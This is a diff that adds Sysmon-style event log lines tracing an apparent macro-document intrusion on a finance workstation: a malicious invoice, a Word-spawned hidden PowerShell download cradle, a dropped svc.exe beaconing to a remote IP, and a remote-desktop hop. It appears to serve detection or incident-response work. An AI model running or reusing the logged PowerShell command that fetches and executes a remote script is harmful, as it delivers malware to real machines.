@@ -1,0 +1,10 @@
+2026-06-15 08:41:02 EventID=11 Image=C:\Users\jmartin\Downloads\Invoice_June.docm TargetFilename=C:\Users\jmartin\Downloads\Invoice_June.docm  Computer=WIN-FIN-07 User=FINANCE\jmartin
+2026-06-15 08:41:55 EventID=1  Image=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE CommandLine="WINWORD.EXE" /n "C:\Users\jmartin\Downloads\Invoice_June.docm"  Computer=WIN-FIN-07 User=FINANCE\jmartin
+2026-06-15 08:42:05 EventID=1  Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe CommandLine=powershell.exe -nop -w hidden -c "IEX(New-Object Net.WebClient).DownloadString('http://45.137.21.130/stage.ps1')"  Computer=WIN-FIN-07 User=FINANCE\jmartin ParentImage=C:\Program Files\Microsoft Office\root\Office16\WINWORD.EXE
+2026-06-15 08:42:10 EventID=3  Image=C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe DestinationIp=45.137.21.130 DestinationPort=443 Protocol=tcp  Computer=WIN-FIN-07 User=FINANCE\jmartin
+2026-06-15 08:43:00 EventID=11 Image=C:\Windows\Temp\svc.exe TargetFilename=C:\Windows\Temp\svc.exe  Computer=WIN-FIN-07 User=SYSTEM
+2026-06-15 08:55:00 EventID=3  Image=C:\Windows\Temp\svc.exe DestinationIp=45.137.21.130 DestinationPort=8443 Protocol=tcp  Computer=WIN-FIN-07 User=SYSTEM
+2026-06-15 09:05:00 EventID=3  Image=C:\Windows\Temp\svc.exe DestinationIp=45.137.21.130 DestinationPort=8443 Protocol=tcp  Computer=WIN-FIN-07 User=SYSTEM
+2026-06-15 09:15:00 EventID=3  Image=C:\Windows\Temp\svc.exe DestinationIp=45.137.21.130 DestinationPort=8443 Protocol=tcp  Computer=WIN-FIN-07 User=SYSTEM
+2026-06-15 09:18:30 EventID=1  Image=C:\Windows\System32\mstsc.exe CommandLine=mstsc.exe /v:WIN-FILE-01  Computer=WIN-FIN-07 User=FINANCE\svc_backup
+2026-06-15 09:25:00 EventID=3  Image=C:\Windows\Temp\svc.exe DestinationIp=45.137.21.130 DestinationPort=8443 Protocol=tcp  Computer=WIN-FIN-07 User=SYSTEM
